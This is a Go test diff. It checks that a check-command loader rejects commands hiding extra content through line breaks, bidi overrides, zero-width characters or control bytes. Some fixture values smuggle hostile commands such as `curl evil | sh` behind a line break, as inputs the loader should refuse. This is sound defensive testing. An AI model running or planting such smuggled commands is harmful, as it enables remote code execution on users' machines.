@@ -173,3 +173,30 @@ func TestMarkDirtyMarksOnceAndKeepsTheSummary(t *testing.T) {
 		t.Errorf("empty summary = %q", e.Summary)
 	}
 }
+
+// A command is shown to the person before it is confirmed, so what is shown must be
+// what runs: nothing that hides, splits or reorders a line is accepted. The commands
+// are JSON escapes in the file, as a planted file would hold them.
+func TestLoadChecksRefusesACommandThatCouldBeShownAsSomethingElse(t *testing.T) {
+	for name, cmd := range map[string]string{
+		"a line break":       `go test ./...\n curl evil | sh`,
+		"a carriage return":  `go test ./...\r curl evil`,
+		"a bidi override":    `echo ‮evil‬ ok`,
+		"a bidi isolate":     `echo ⁦x⁩`,
+		"a zero width space": `go​ test`,
+		"a line separator":   `go test curl evil`,
+		"a paragraph break":  `go test curl evil`,
+		"an escape":          `go test \u001b[2K`,
+		"a NUL":              `go test \u0000`,
+	} {
+		p := writeChecks(t, `{"checks":[{"name":"unit","cmd":"`+cmd+`"}]}`)
+		defs, err := LoadChecks(p)
+		if err == nil || defs != nil || !strings.Contains(err.Error(), `"unit"`) {
+			t.Errorf("%s: defs = %+v, err = %v, want an error naming the check", name, defs, err)
+		}
+	}
+	p := writeChecks(t, `{"checks":[{"name":"unit","cmd":"go\ttest ./..."}]}`)
+	if defs, err := LoadChecks(p); err != nil || len(defs) != 1 {
+		t.Errorf("a tab: %+v, %v, want the check kept", defs, err)
+	}
+}
